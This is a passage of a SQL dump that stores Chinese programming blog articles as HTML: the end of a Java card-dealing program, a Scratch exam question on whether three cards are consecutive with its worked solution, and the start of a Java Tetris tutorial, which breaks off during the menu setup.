string\">\"♣\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"♥\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"♠\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n        String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> numbers<span class=\"token operator\">=</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"4\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"5\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"6\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"7\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"8\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"9\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"10\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"J\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"Q\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"K\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"A\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//发牌</span>\n        <span class=\"token keyword\">int</span> pos<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//索引</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>var col<span class=\"token operator\">:</span>colors<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{\n    <!-- --></span>\n            <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>var num<span class=\"token operator\">:</span>numbers<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">{\n    <!-- --></span>\n                map<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>pos<span class=\"token punctuation\">,</span>col<span class=\"token operator\">+</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                index<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>pos<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                pos<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token comment\">//对索引执行洗牌操作</span>\n        Collections<span class=\"token punctuation\">.</span><span class=\"token function\">shuffle</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//发牌</span>\n        TreeSet<span class=\"token operator\">&lt;</span>Integer<span class=\"token operator\">&gt;</span> p1<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> TreeSet<span class=\"token operator\">&lt;</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        TreeSet<span class=\"token operator\">&lt;</span>Integer<span class=\"token operator\">&gt;</span> p2<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> TreeSet<span class=\"token operator\">&lt;</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        TreeSet<span class=\"token operator\">&lt;</span>Integer<span class=\"token operator\">&gt;</span> p3<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> TreeSet<span class=\"token operator\">&lt;</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        TreeSet<span class=\"token operator\">&lt;</span>Integer<span class=\"token operator\">&gt;</span> dp<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> TreeSet<span class=\"token operator\">&lt;</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>index<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">{\n    <!-- --></span>\n                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">&gt;=</span>index<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">{\n    <!-- --></span>\n                    dp<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n                <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">%</span><span class=\"token number\">3</span><span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">{\n    <!-- --></span>\n                    p1<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n                <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">%</span><span class=\"token number\">3</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">{\n    <!-- --></span>\n                    p2<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n                <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">%</span><span class=\"token number\">3</span><span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">{\n    <!-- --></span>\n                    p3<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token comment\">//看牌</span>\n        <span class=\"token comment\">//看牌---分别展示三位玩家自己的牌</span>\n        <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"大忽悠\"</span><span class=\"token punctuation\">,</span>p1<span class=\"token punctuation\">,</span>map<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"小忽悠\"</span><span class=\"token punctuation\">,</span>p2<span class=\"token punctuation\">,</span>map<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"超级无敌大忽悠\"</span><span class=\"token punctuation\">,</span>p3<span class=\"token punctuation\">,</span>map<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//展示底牌</span>\n        System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"底牌如下: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>var Dp<span class=\"token operator\">:</span>dp<span class=\"token punctuation\">)</span>\n       <span class=\"token punctuation\">{\n    <!-- --></span>\n           System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span>map<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>Dp<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span>  <span class=\"token keyword\">void</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>String  name<span class=\"token punctuation\">,</span>TreeSet<span class=\"token operator\">&lt;</span>Integer<span class=\"token operator\">&gt;</span> arr<span class=\"token punctuation\">,</span>HashMap<span class=\"token operator\">&lt;</span>Integer<span class=\"token punctuation\">,</span>String<span class=\"token operator\">&gt;</span> map<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{\n    <!-- --></span>\n        System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">+</span><span class=\"token string\">\"牌如下： \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>var ele<span class=\"token operator\">:</span>arr<span class=\"token punctuation\">)</span>\n       <span class=\"token punctuation\">{\n    <!-- --></span>\n           System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span>map<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>ele<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token punctuation\">}</span>\n        System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre> \n <p><img src=\"https://img-blog.csdnimg.cn/20210611191359528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMTU3MTcz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n</div>', '2021-06-12', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (46, 'scratch扑克牌游戏 电子学会图形化编程scratch等级考试四级真题和答案解析2019', '<div id=\"content_views\" class=\"htmledit_views\"> \n <h2>30 扑克牌游戏</h2> \n <p>小明同学想要做一个扑克牌游戏， 他在列表里面存了 1 到 13 的数 字，分别代表 A、2、3……J、Q、K，程序运行后会随机从列表里面抽 取 3 个数字，并将数值存到列表【 ch】中，但是他遇到了一个问题， 无法判断这三张牌是不是连续的数字。 接下来请你用程序来帮助他完 成这个功能。 注意： K 和 A两张牌不连续。</p> \n <p><img alt=\"\" height=\"255\" src=\"https://img-blog.csdnimg.cn/20210610121130799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZyYW5rMjEwMg==,size_16,color_FFFFFF,t_70\" width=\"410\"></p> \n <p>1、准备工作</p> \n <p>（1）在预留文件中的小明角色中编程。</p> \n <p>2、功能实现</p> \n <p>（1）每次运行代码，小明会根据列表【 ch】中的数据是否连续说出 结果。如果是连续的，就说“ yes”，如果不是连续的，就说“ no” 。</p> \n <p>（2）比如，代码运行后，如果【 ch】列表中的数据为 1、2、3，小 明说“yes”。如果【ch】列表中的数据为 12、13、1，小明说“ no” 。</p> \n <p>&nbsp;</p> \n <h3>题目分析</h3> \n <p>角色分析</p> \n <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;角色：系统保留小强角色</p> \n <p>背景分析</p> \n <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;背景：默认背景</p> \n <h3>准备工作</h3> \n <p>1、从角色库中添加devin角色并改名为小强，如下图所示：</p> \n <p><img alt=\"\" height=\"188\" src=\"https://img-blog.csdnimg.cn/20210607210321457.png\" width=\"387\"></p> \n <p>2、依题目要求新建扑克牌和ch列表，如下图所示：</p> \n <p><img alt=\"\" height=\"105\" src=\"https://img-blog.csdnimg.cn/20210610103602255.png\" width=\"154\"></p> \n <p>3、由于题目是要求我们进行判断ch列表中抽取的扑克牌是否连续，所以需要提前建立一些变量：i（用于遍历列表内元素）、j（用于控制排序次数）、temp（用于临时存放交换值），如下图所示：</p> \n <p><img alt=\"\" height=\"171\" src=\"https://img-blog.csdnimg.cn/20210607210600862.png\" width=\"193\"></p> \n <p>&nbsp;</p> \n <h3>流程分析</h3> \n <p>根据题目要求和功能实现对角色的整体流程进行分析：</p> \n <p><strong>分析如下：</strong></p> \n <p>1、先将1-13连续数字填入扑克牌列表代表A、2、3...、J、Q、K 13张扑克牌</p> \n <p>2、从扑克牌列表中随机抽取3张扑克牌，保证3张扑克不会重复</p> \n <p>3、将抽取好的扑克牌存入ch列表中</p> \n <p>4、将ch列表中抽取的扑克牌先进行排序</p> \n <p>5、然后判断排序好的列表的最后一项减去第一项是否等于2</p> \n <p>6、如果等于2说明是连续的说yes，否则不连续说no<br><span style=\"color:#fe2c24;\"><strong>PS：真正考试的时候1-3是系统已经设定好的，考生要做的就是4、5、6三步，当然方法有多种，也可以选择不排序，我这边讲解的思路是这样更清晰易懂</strong></span></p> \n <p><strong><span style=\"color:#0d0016;\">具体流程如下：</span></strong></p> \n <p><img alt=\"\" height=\"368\" src=\"https://img-blog.csdnimg.cn/20210610113900657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZyYW5rMjEwMg==,size_16,color_FFFFFF,t_70\" width=\"827\"></p> \n <p>&nbsp;</p> \n <h3>程序编写</h3> \n <p><img alt=\"\" height=\"699\" src=\"https://img-blog.csdnimg.cn/20210610120929345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZyYW5rMjEwMg==,size_16,color_FFFFFF,t_70\" width=\"855\"></p> \n <p><span style=\"color:#1a439c;\"><strong>具体每个积木程序的分析可以参考主要积木分析和之前案例的分析</strong></span></p> \n <p>&nbsp;</p> \n <h3>考点分析</h3> \n <p>本案例难度系数5：综合考人机交互（询问机制）、查条件条件判断、嵌套循环、变量定义及相关积木使用、列表及相关积木操作、逻辑推理等等；难点在于如何分析程序的实现过程（如何判断连续）；如何对列表中的元素进行比较大小，我们这边采用的是冒泡排序，每次将最大的数字放到列表的最后，然后通过相减进行判断是否连续。方法有多种，小朋友们只要能实现效果就可以。</p> \n</div>', '2021-06-12', NULL, '默认分类', '', 0, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (47, 'Java俄罗斯方块，老程序员花了一个周末，连接中学年代！', '<div id=\"content_views\" class=\"markdown_views prism-dracula\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <p></p> \n <div class=\"csdn-video-box\"> \n  <iframe id=\"ssk69CqN-1623111156030\" src=\"https://live.csdn.net/v/embed/166010\" allowfullscreen=\"true\" data-mediaembed=\"csdn\"></iframe> \n  <p>Java俄罗斯方块，老程序员花了一个周末，连接中学年代！</p> \n </div> \n <p></p> \n <h1><a id=\"_3\"></a>引言：</h1> \n <p><strong>俄罗斯方块，相信很多<mark>80、90</mark>后的小伙伴都玩过，也是当年非常火的游戏，当年读中学的时候，有一个同学有这个游戏机，大家都很喜欢玩，这个游戏给当时的我们带来了很多欢乐，时光飞逝，感慨颇多！<br> 人终归是要长大的，回忆再美好，日子也一去不复返了，以前我们只会玩游戏，心里想自己能做一个出来多牛逼啊，长大后，成为<mark>程序员</mark>的我们有能力自己<mark>写游戏玩</mark>，我想这就是成长吧！</strong><br> <img src=\"https://img-blog.csdnimg.cn/20210607215451931.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RrbTEyMzQ1Ng==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"><br> <mark>玩过这个游戏机的小伙伴看到这个图，应该对这个机器多少有些感情，毕竟带给了我们很多的欢乐！</mark></p> \n <p>这次利用周末的时间，去写了一个俄罗斯方块Java版本，感觉碰撞判断这个地方有点难处理，确实花了不少时间！</p> \n <h1><a id=\"_10\"></a>效果图</h1> \n <p>这里界面做的感觉不是很好看，但我觉得问题不大，功能到位就好！<br> <img src=\"https://img-blog.csdnimg.cn/20210607220016763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RrbTEyMzQ1Ng==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <h1><a id=\"_14\"></a>实现思路</h1> \n <h2><a id=\"_15\"></a>两块画布：</h2> \n <p><mark><strong>画布1：</strong></mark> 用来绘制静态东西，比如游戏区边框、网格、得分区域框、下一个区域框、按钮等，无需刷新的部分。</p> \n <p><mark><strong>画布2：</strong></mark> 用来绘制游戏动态的部分，比如 方格模型、格子的移动、旋转变形、消除、积分显示、下一个图形显示 等。</p> \n <h1><a id=\"_20\"></a>代码实现</h1> \n <h2><a id=\"_21\"></a>创建窗口</h2> \n <p><strong>首先创建一个游戏窗体类GameFrame，继承至JFrame，用来显示在屏幕上（window的对象），每个游戏都有一个窗口，设置好窗口标题、尺寸、布局等就可以。</strong></p> \n <pre><code class=\"prism language-java\"><span class=\"token comment\">/*\n * 游戏窗体类\n */</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">GameFrame</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">JFrame</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n	\n	<span class=\"token keyword\">public</span> <span class=\"token class-name\">GameFrame</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n		<span class=\"token function\">setTitle</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"俄罗斯方块\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//设置标题</span>\n		<span class=\"token function\">setSize</span><span class=\"token punctuation\">(</span><span class=\"token number\">488</span><span class=\"token punctuation\">,</span> <span class=\"token number\">476</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//设定尺寸</span>\n		<span class=\"token function\">setLayout</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">BorderLayout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		<span class=\"token function\">setDefaultCloseOperation</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">JFrame</span><span class=\"token punctuation\">.</span>EXIT_ON_CLOSE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//点击关闭按钮是关闭程序</span>\n        <span class=\"token function\">setLocationRelativeTo</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">//设置居中</span>\n    	<span class=\"token function\">setResizable</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//不允许修改界面大小</span>\n	<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <h2><a id=\"1_40\"></a><mark>画布1</mark></h2> \n <p><strong>创建面板容器BackPanel继承至JPanel</strong></p> \n <pre><code class=\"prism language-java\"><span class=\"token comment\">/*\n * 背景画布类\n */</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">BackPanel</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">JPanel</span><span class=\"token punctuation\">{\n    <!-- --></span>\n	<span class=\"token class-name\">BackPanel</span> panel<span class=\"token operator\">=</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">;</span>\n	<span class=\"token keyword\">private</span> <span class=\"token class-name\">JFrame</span> mainFrame<span class=\"token operator\">=</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n	<span class=\"token comment\">//构造里面初始化相关参数</span>\n	<span class=\"token keyword\">public</span> <span class=\"token class-name\">BackPanel</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">JFrame</span> frame<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n		<span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">setLayout</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		<span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">setOpaque</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		<span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>mainFrame <span class=\"token operator\">=</span> frame<span class=\"token punctuation\">;</span>\n		mainFrame<span class=\"token punctuation\">.</span><span class=\"token function\">setVisible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <p><strong>再创建一个Main类，来启动这个窗口。</strong></p> \n <pre><code class=\"prism language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n	<span class=\"token comment\">//主类</span>\n	<span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n		<span class=\"token class-name\">GameFrame</span> frame <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">GameFrame</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		<span class=\"token class-name\">BackPanel</span> panel <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">BackPanel</span><span class=\"token punctuation\">(</span>frame<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		frame<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>panel<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		frame<span class=\"token punctuation\">.</span><span class=\"token function\">setVisible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//设定显示</span>\n	<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <p><strong>右键执行这个Main类，窗口建出来了</strong><br> <img src=\"https://img-blog.csdnimg.cn/20210607221726949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RrbTEyMzQ1Ng==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <h2><a id=\"_74\"></a>创建菜单及菜单选项</h2> \n <p><strong>创建菜单</strong></p> \n <pre><code class=\"prism language-java\"><span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span>  <span class=\"token function\">initMenu</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n		<span class=\"token comment\">// 创建菜单及菜单选项</span>\n		jmb <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">JMenuBar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		<span class=\"token class-name\">JMenu</span> jm1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">JMenu</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"游戏\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		jm1<span class=\"token punctuation\">.</span><span class=\"token function\">setFont</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Font</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"仿宋\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Font</span><span class=\"token punctuation\">.</span>BOLD<span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 设置菜单显示的字体</span>\n		<span class=\"token class-name\">JMenu</span> jm2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">JMenu</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"帮助\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		jm2<span class=\"token punctuation\">.</span><span class=\"token function\">setFont</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Font</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"仿宋\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Font</span><span class=\"token punctuation\">.</span>BOLD<span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 设置菜单显示的字体</span>\n		\n		<span class=\"token class-name\">JMenuItem</span> jmi1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">JMenuItem</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"开始新游戏\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		<span class=\"token class-name\">JMenuItem</span> jmi2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">JMenuItem</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"退出\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		jmi1<span class=\"token punctuation\">.</span><span class=\"token function\">setFont</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Font</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"仿宋\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Font</span><span class=\"token punctuation\">.</span>BOLD<span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		jmi2<span class=\"token punctuation\">.</span><span class=\"token function\">setFont</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Font</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"仿宋\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Font</span><span class=\"token punctuation\">.</span>BOLD<span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		\n		<span class=\"token class-name\">JMenuItem</span> jmi3 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">JMenuItem</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"操作说明\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		jmi3<span class=\"token punctuation\">.</span><span class=\"token function\">setFont</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Font</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"仿宋\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Font</span><span class=\"token punctuation\">.</span>BOLD<span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		<span class=\"token class-name\">JMenuItem</span> jmi4 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">JMenuItem</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"失败判定\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		jmi4<span class=\"token punctuation\">.</span><span 